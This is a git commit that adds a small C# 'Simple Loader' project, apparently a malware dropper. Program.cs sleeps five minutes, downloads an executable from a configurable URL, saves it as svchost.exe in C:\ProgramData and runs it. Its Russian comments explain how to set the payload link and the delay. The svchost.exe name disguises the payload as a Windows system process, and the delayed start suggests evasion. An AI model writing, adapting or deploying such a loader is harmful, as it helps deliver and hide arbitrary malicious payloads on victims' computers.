44226da73562fc6edb66afe17395f4f5b609c346
Saintbie <denviout@yandex.ru>
2021-03-13 21:03:32 +0300

    Simple Loader

---
+++ Program.cs
@@ -0,0 +1,32 @@
+﻿using System.Diagnostics;
+using System.Net;
+using System;
+using System.Threading;
+
+namespace DownloadFile
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            WebClient wc = new WebClient();
+
+            // Ниже необходимо ввести прямую ссылку на ваш файл
+            string url = "http://localhost/file.exe";
+
+            // Куда будет скачиваться ваш файл и под каким названием?
+            string save_path = "C:\\ProgramData\\";
+            string name = "svchost.exe";
+
+            // Через сколько МС (миллисекунд) запустится ваш файл?
+            // 30 секунд - 30000 миллисекунд
+            // 60 секунд - 60000 миллисекунд
+            // 5 минут - 300000 миллисекунд
+            Thread.Sleep(300000);
+
+            // Если вы меняли местоположение загрузки, то поменяйте их ниже
+            wc.DownloadFile(url, save_path + name);
+            System.Diagnostics.Process.Start(@"C:\ProgramData\svchost.exe");
+        }
+    }
+}
---
+++ Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// Общие сведения об этой сборке предоставляются следующим набором
+// набора атрибутов. Измените значения этих атрибутов для изменения сведений,
+// связанных со сборкой.
+[assembly: AssemblyTitle("SimpleLoader")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("SimpleLoader")]
+[assembly: AssemblyCopyright("Copyright © 2021 Saintbie")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Установка значения False для параметра ComVisible делает типы в этой сборке невидимыми
+// для компонентов COM. Если необходимо обратиться к типу в этой сборке через
+// COM, следует установить атрибут ComVisible в TRUE для этого типа.
+[assembly: ComVisible(false)]
+
+// Следующий GUID служит для идентификации библиотеки типов, если этот проект будет видимым для COM
+[assembly: Guid("83a82e29-0c03-4dea-a11a-a557c7f564c1")]
+
+// Сведения о версии сборки состоят из указанных ниже четырех значений:
+//
+//      Основной номер версии
+//      Дополнительный номер версии
+//      Номер сборки
+//      Редакция
+//
+// Можно задать все значения или принять номера сборки и редакции по умолчанию 
+// используя "*", как показано ниже:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("51.2.621.4")]
+[assembly: AssemblyFileVersion("51.2.621.4")]
